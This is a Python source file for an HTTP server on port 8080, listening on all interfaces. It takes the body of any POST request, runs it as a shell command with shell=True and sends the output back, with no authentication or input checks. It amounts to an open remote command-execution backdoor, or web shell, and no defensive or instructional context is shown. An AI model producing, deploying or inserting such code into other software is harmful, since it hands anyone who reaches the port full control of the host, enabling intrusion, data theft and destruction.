# Importing necessary modules
from http.server import BaseHTTPRequestHandler, HTTPServer
import subprocess
import os

# Defining the request handler class
class S(BaseHTTPRequestHandler):
    # Method to set the response headers
    def _set_response(self):
        self.send_response(200)  # Sending HTTP 200 OK response
        self.send_header('Content-type', 'text/html')  # Setting the content type to HTML
        self.end_headers()  # Ending the headers

    # Method to handle GET requests
    def do_GET(self):
        self._set_response()  # Setting the response headers
        self.wfile.write("Server is running".encode('utf-8'))  # Writing a response message

    # Method to handle POST requests
    def do_POST(self):
        # Getting the length of the incoming data
        content_length = int(self.headers['Content-Length'])
        # Reading the incoming data
        post_data = self.rfile.read(content_length)
        # Decoding the command from the incoming data
        command = post_data.decode('utf-8')
        print(f"Received command: {command}")  # Printing the received command

        try:
            # Running the received command using subprocess
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            response = result.stdout  # Capturing the output of the command
        except Exception as e:
            response = str(e)  # Capturing any exceptions that occur

        self._set_response()  # Setting the response headers
        self.wfile.write(response.encode('utf-8'))  # Writing the command output as the response

# Function to run the HTTP server
def run(server_class=HTTPServer, handler_class=S, port=8080):
    server_address = ('', port)  # Defining the server address
    httpd = server_class(server_address, handler_class)  # Creating the HTTP server instance
    print(f"Starting httpd on port {port}")  # Printing the start message
    httpd.serve_forever()  # Starting the server

# Main block to run the server
if __name__ == "__main__":
    run()  # Running the server
